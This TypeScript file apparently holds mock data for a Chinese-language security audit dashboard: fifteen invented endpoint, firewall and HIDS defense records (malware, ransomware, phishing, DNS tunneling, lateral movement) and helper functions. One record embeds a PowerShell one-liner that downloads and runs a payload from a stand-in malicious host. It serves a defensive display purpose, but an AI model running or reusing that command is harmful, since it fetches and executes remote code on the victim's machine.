// mock-defense-audit.ts
import type { DefenseAudit, DefenseActionType } from "@/features/audit/types"
import type { ExecutionSource } from "@/features/audit/types"

export const mockDefenseAudits: DefenseAudit[] = [
  {
    // 基础审计字段
    id: "host-001",
    name: "WIN-PC-001",
    triggeredAt: new Date(Date.now() - 3 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 3 * 60 * 60 * 1000 + 1000).toISOString(),
    severity: "HIGH",
    status: "SUCCESS",
    ruleId: "rule-malware-001",
    ruleName: "恶意软件实时防护",
    message: "检测到恶意软件并成功阻断",
    tags: ["恶意软件", "实时防护", "文件检测"],

    // 防御特定字段
    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "ENDPOINT",

    // 防御详情
    details: {
      detectionType: "SIGNATURE",
      threatName: "Trojan.Win32.Generic",
      filePath: "C:\\Users\\test\\malicious.exe",
      fileHash: "a1b2c3d4e5f678901234567890123456789012345",
      actionTaken: "文件执行阻断",
      confidence: 95,
      scanEngine: "AMSI",
      preventionMethod: "Process Creation Blocked",
    },
  },
  {
    id: "host-002",
    name: "SRV-WEB-002",
    triggeredAt: new Date(Date.now() - 5 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 5 * 60 * 60 * 1000).toISOString(),
    severity: "MEDIUM",
    status: "SUCCESS",
    ruleId: "rule-network-002",
    ruleName: "异常网络连接检测",
    message: "检测到异常外联行为",
    tags: ["网络检测", "外联行为"],

    auditType: "DEFENSE",
    actionType: "ALERT",
    executionSource: "FIREWALL",

    details: {
      detectionType: "BEHAVIORAL",
      localAddress: "192.168.1.100",
      localPort: 54321,
      remoteAddress: "45.76.123.89",
      remotePort: 443,
      protocol: "TCP",
      processName: "svchost.exe",
      dataTransferred: "2.1 MB",
      connectionDuration: "00:02:15",
      anomalyScore: 78,
      threatCategory: "Suspicious Outbound",
    },
  },
  {
    id: "host-003",
    name: "WS-USER-003",
    triggeredAt: new Date(Date.now() - 8 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 8 * 60 * 60 * 1000 + 1000).toISOString(),
    severity: "CRITICAL",
    status: "FAILED",
    ruleId: "rule-process-003",
    ruleName: "可疑进程行为监控",
    message: "进程行为阻断失败：权限不足",
    tags: ["进程保护", "权限提升"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "HIDS",

    details: {
      detectionType: "BEHAVIORAL",
      processName: "malware_service.exe",
      processId: 1234,
      suspiciousAction: "Code Injection",
      targetProcess: "explorer.exe",
      injectionMethod: "CreateRemoteThread",
      failureReason: "Insufficient privileges to terminate process",
      mitigationApplied: "Process isolated for further analysis",
    },
  },
  {
    id: "host-004",
    name: "WIN-DEV-004",
    triggeredAt: new Date(Date.now() - 12 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 12 * 60 * 60 * 1000).toISOString(),
    severity: "LOW",
    status: "SUCCESS",
    ruleId: "rule-file-004",
    ruleName: "文件防护提示",
    message: "检测到潜在风险文件，等待用户确认",
    tags: ["文件防护", "用户交互"],

    auditType: "DEFENSE",
    actionType: "PROMPT",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "REPUTATION",
      filePath: "C:\\Users\\dev\\unknown_tool.exe",
      fileHash: "b2c3d4e5f678901234567890123456789012345a1",
      fileReputation: "UNKNOWN",
      publisher: "Unknown Publisher",
      userResponse: "ALLOWED",
      promptType: "File Execution",
      riskFactors: ["No digital signature", "Low prevalence"],
    },
  },
  {
    id: "host-005",
    name: "SRV-DB-005",
    triggeredAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 1 * 24 * 60 * 60 * 1000 + 1000).toISOString(),
    severity: "HIGH",
    status: "SUCCESS",
    ruleId: "rule-brute-005",
    ruleName: "暴力破解防护",
    message: "检测到暴力破解攻击，IP已阻断",
    tags: ["暴力破解", "账户安全"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "FIREWALL",

    details: {
      detectionType: "BEHAVIORAL",
      attackType: "Brute Force",
      targetService: "SSH",
      sourceIP: "198.51.100.23",
      attemptCount: 45,
      timeWindow: "5 minutes",
      blockedDuration: "1 hour",
      usernameTargeted: "root",
      successPrevention: true,
    },
  },
  {
    id: "host-006",
    name: "WIN-TEST-006",
    triggeredAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "MEDIUM",
    status: "SUCCESS",
    ruleId: "rule-dlp-006",
    ruleName: "数据泄露防护告警",
    message: "检测到敏感数据外传行为",
    tags: ["数据防泄露", "敏感信息"],

    auditType: "DEFENSE",
    actionType: "ALERT",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "CONTENT",
      dataType: "Credit Card Numbers",
      filePath: "C:\\Users\\test\\customer_data.xlsx",
      destination: "cloud-storage.com",
      dataSize: "150 KB",
      matchedPatterns: ["\\b\\d{16}\\b", "\\b\\d{3}\\b"],
      confidence: 92,
      user: "testuser",
      actionRecommended: "Review and quarantine file",
    },
  },
  {
    id: "host-007",
    name: "SRV-FILE-007",
    triggeredAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 3 * 24 * 60 * 60 * 1000 + 1000).toISOString(),
    severity: "CRITICAL",
    status: "SUCCESS",
    ruleId: "rule-ransomware-007",
    ruleName: "勒索软件行为阻断",
    message: "检测到勒索软件加密行为，已阻断",
    tags: ["勒索软件", "文件加密"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "BEHAVIORAL",
      processName: "crypto_locker.exe",
      processId: 2345,
      encryptionTargets: ["documents", "images", "databases"],
      filesEncrypted: 0,
      filesProtected: 156,
      encryptionMethod: "AES-256",
      ransomNoteCreated: false,
      attackPrevented: true,
    },
  },
  {
    id: "host-008",
    name: "WS-MARKETING-008",
    triggeredAt: new Date(Date.now() - 4 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 4 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "LOW",
    status: "SUCCESS",
    ruleId: "rule-browser-008",
    ruleName: "浏览器安全提示",
    message: "访问潜在风险网站，等待用户确认",
    tags: ["浏览器防护", "网页安全"],

    auditType: "DEFENSE",
    actionType: "PROMPT",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "REPUTATION",
      url: "http://suspicious-download.com/software.exe",
      domainReputation: "MALICIOUS",
      riskCategory: "Malware Distribution",
      browser: "Chrome",
      userResponse: "BLOCKED",
      promptType: "Website Access",
      threatIntelligence: "Known malware hosting domain",
    },
  },
  {
    id: "host-009",
    name: "SRV-MAIL-009",
    triggeredAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 5 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "HIGH",
    status: "SUCCESS",
    ruleId: "rule-phishing-009",
    ruleName: "钓鱼邮件检测告警",
    message: "检测到钓鱼邮件特征",
    tags: ["邮件安全", "钓鱼检测"],

    auditType: "DEFENSE",
    actionType: "ALERT",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "CONTENT",
      emailSubject: "Urgent: Your Account Security Update",
      sender: "security/fake-bank.com",
      recipient: "user/company.com",
      phishingIndicators: ["Urgency language", "Suspicious links", "Grammar errors"],
      maliciousLinks: ["http://fake-bank-login.com"],
      attachmentAnalysis: "No malicious attachments",
      confidence: 88,
      actionTaken: "Quarantined email",
    },
  },
  {
    id: "host-010",
    name: "WIN-ENG-010",
    triggeredAt: new Date(Date.now() - 6 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 6 * 24 * 60 * 60 * 1000 + 1000).toISOString(),
    severity: "MEDIUM",
    status: "FAILED",
    ruleId: "rule-memory-010",
    ruleName: "内存防护阻断",
    message: "内存注入检测失败：绕过检测",
    tags: ["内存保护", "注入检测"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "HIDS",

    details: {
      detectionType: "MEMORY",
      processName: "legitimate_tool.exe",
      processId: 3456,
      injectionTechnique: "Process Hollowing",
      targetProcess: "notepad.exe",
      detectionBypass: true,
      bypassMethod: "Timing-based evasion",
      memoryRegions: 3,
      failureAnalysis: "Advanced evasion technique used",
    },
  },
  {
    id: "host-011",
    name: "SRV-APP-011",
    triggeredAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 10 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "HIGH",
    status: "SUCCESS",
    ruleId: "rule-exploit-011",
    ruleName: "漏洞利用防护",
    message: "检测到漏洞利用尝试，已阻断",
    tags: ["漏洞防护", " exploit防护"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "EXPLOIT",
      cve: "CVE-2023-12345",
      targetSoftware: "Adobe Reader",
      version: "2023.001.20043",
      exploitTechnique: "Heap Spraying",
      shellcodeDetected: true,
      mitigation: "DEP+ASLR",
      protectionBypassAttempted: false,
    },
  },
  {
    id: "host-012",
    name: "WS-SALES-012",
    triggeredAt: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 15 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "LOW",
    status: "SUCCESS",
    ruleId: "rule-usb-012",
    ruleName: "USB设备接入提示",
    message: "未知USB设备接入，等待授权",
    tags: ["设备控制", "USB安全"],

    auditType: "DEFENSE",
    actionType: "PROMPT",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "DEVICE",
      deviceType: "USB Mass Storage",
      vendorId: "0x1234",
      productId: "0x5678",
      serialNumber: "SN7890123456",
      deviceName: "Generic USB Device",
      userResponse: "ALLOWED",
      promptType: "Device Access",
      riskAssessment: "Medium - Unknown manufacturer",
    },
  },
  {
    id: "host-013",
    name: "SRV-BACKUP-013",
    triggeredAt: new Date(Date.now() - 20 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 20 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "HIGH",
    status: "SUCCESS",
    ruleId: "rule-lateral-013",
    ruleName: "横向移动检测告警",
    message: "检测到可疑的横向移动行为",
    tags: ["横向移动", "内网渗透"],

    auditType: "DEFENSE",
    actionType: "ALERT",
    executionSource: "HIDS",

    details: {
      detectionType: "BEHAVIORAL",
      technique: "Pass the Hash",
      sourceHost: "192.168.1.100",
      targetHost: "192.168.1.150",
      service: "SMB",
      accountUsed: "DOMAIN\\service_account",
      authenticationType: "NTLM",
      success: false,
      indicators: ["Unusual service account usage", "Multiple authentication failures"],
    },
  },
  {
    id: "host-014",
    name: "WIN-HR-014",
    triggeredAt: new Date(Date.now() - 25 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 25 * 24 * 60 * 60 * 1000 + 1000).toISOString(),
    severity: "MEDIUM",
    status: "SUCCESS",
    ruleId: "rule-script-014",
    ruleName: "恶意脚本防护",
    message: "检测到恶意PowerShell脚本，已阻断执行",
    tags: ["脚本防护", "PowerShell"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "ENDPOINT",

    details: {
      detectionType: "SCRIPT",
      scriptType: "PowerShell",
      scriptContent: 'IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload.ps1")',
      executionPolicy: "Bypass",
      obfuscation: true,
      maliciousIntent: "Download and execute payload",
      blockedAt: "Script execution",
      logOnly: false,
    },
  },
  {
    id: "host-015",
    name: "SRV-DNS-015",
    triggeredAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString(),
    resolvedAt: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString(),
    severity: "CRITICAL",
    status: "SUCCESS",
    ruleId: "rule-dns-015",
    ruleName: "DNS隧道检测阻断",
    message: "检测到DNS隧道通信，已阻断",
    tags: ["DNS安全", "数据渗出"],

    auditType: "DEFENSE",
    actionType: "BLOCK",
    executionSource: "FIREWALL",

    details: {
      detectionType: "NETWORK",
      domain: "malicious-data.xyz",
      queryType: "TXT",
      dataLength: 512,
      queryFrequency: "120 queries/minute",
      entropyScore: 8.7,
      protocol: "DNS over UDP",
      tunnelType: "DNS Tunneling",
      dataExfiltration: true,
    },
  },
]

// 按防御类型分类的辅助函数
export const getDefenseAuditsByActionType = (actionType: DefenseActionType): DefenseAudit[] => {
  return mockDefenseAudits.filter((audit) => audit.actionType === actionType)
}

// 按执行来源分类的辅助函数
export const getDefenseAuditsBySource = (source: ExecutionSource): DefenseAudit[] => {
  return mockDefenseAudits.filter((audit) => audit.executionSource === source)
}

// 按严重等级分类的辅助函数
export const getDefenseAuditsBySeverity = (severity: string): DefenseAudit[] => {
  return mockDefenseAudits.filter((audit) => audit.severity === severity)
}

// 按状态分类的辅助函数
export const getDefenseAuditsByStatus = (status: string): DefenseAudit[] => {
  return mockDefenseAudits.filter((audit) => audit.status === status)
}

// 统计信息
export const getDefenseStats = () => {
  const total = mockDefenseAudits.length
  const success = mockDefenseAudits.filter((audit) => audit.status === "SUCCESS").length
  const failed = mockDefenseAudits.filter((audit) => audit.status === "FAILED").length
  const successRate = total > 0 ? (success / total) * 100 : 0

  // 按防御类型统计
  const alertCount = mockDefenseAudits.filter((audit) => audit.actionType === "ALERT").length
  const blockCount = mockDefenseAudits.filter((audit) => audit.actionType === "BLOCK").length
  const promptCount = mockDefenseAudits.filter((audit) => audit.actionType === "PROMPT").length

  // 按执行来源统计
  const endpointCount = mockDefenseAudits.filter((audit) => audit.executionSource === "ENDPOINT").length
  const firewallCount = mockDefenseAudits.filter((audit) => audit.executionSource === "FIREWALL").length
  const hidsCount = mockDefenseAudits.filter((audit) => audit.executionSource === "HIDS").length

  // 按严重等级统计
  const criticalCount = mockDefenseAudits.filter(
    (audit) => audit.severity === "HIGH" || audit.severity === "CRITICAL",
  ).length

  return {
    total,
    success,
    failed,
    successRate,
    alertCount,
    blockCount,
    promptCount,
    endpointCount,
    firewallCount,
    hidsCount,
    criticalCount,
  }
}

// 获取检测类型统计
export const getDetectionTypeStats = () => {
  const detectionTypes: Record<string, number> = {}

  mockDefenseAudits.forEach((audit) => {
    const detectionType = audit.details?.detectionType || "UNKNOWN"
    detectionTypes[detectionType] = (detectionTypes[detectionType] || 0) + 1
  })

  return detectionTypes
}

export default mockDefenseAudits
